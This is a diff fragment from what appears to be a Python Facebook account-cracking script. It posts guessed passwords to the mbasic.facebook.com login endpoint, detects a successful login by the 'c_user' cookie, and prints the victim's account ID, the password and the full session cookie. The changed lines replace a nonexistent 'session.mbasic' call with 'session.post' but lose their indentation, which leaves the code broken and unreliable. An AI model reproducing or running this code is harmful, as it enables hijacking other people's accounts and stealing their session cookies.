@@ -500,11 +500,11 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.mbasic('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[151:166]
+     lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+     log_cookies=session.cookies.get_dict().keys()
+     if 'c_user' in log_cookies:
+     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+     cid = coki[151:166]
                 print('\033[1;96m[\033[1;92m[𝗚𝗫-OK]\033[1;96m[💥🦞🍓🥭]\033[1;92m' +cid+' | '+ps+'\033[1;94m = '+tahunng(cid))
                 print ('\033[1;32m[‎👑🎁]\033[1;91m = \x1b[38;5;126m'+coki+ '')
                 #print ('\033[1;32m[‎💚]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
